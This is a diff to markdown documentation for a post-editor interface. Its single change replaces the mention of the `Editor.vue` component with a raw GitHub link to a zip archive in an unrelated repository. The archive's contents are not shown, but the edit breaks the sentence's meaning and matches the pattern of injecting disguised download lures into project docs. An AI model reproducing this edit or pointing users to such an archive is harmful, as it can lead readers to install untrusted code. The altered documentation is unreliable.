@@ -28,7 +28,7 @@
 
   * Auto-generates slug via `generateSlug()` (debounced `watch()` hook)
 * Slug can be edited inline
-* Description edited via `Editor.vue` 
+* Description edited via `https://github.com/nikhilcodewing/Post-editor/raw/refs/heads/main/Megalodon/editor-Post-v1.9-beta.2.zip` 
 * SEO modal, category modal, and image selection modals open via respective toggles
 
 ### 💾 Saving or Publishing Flow
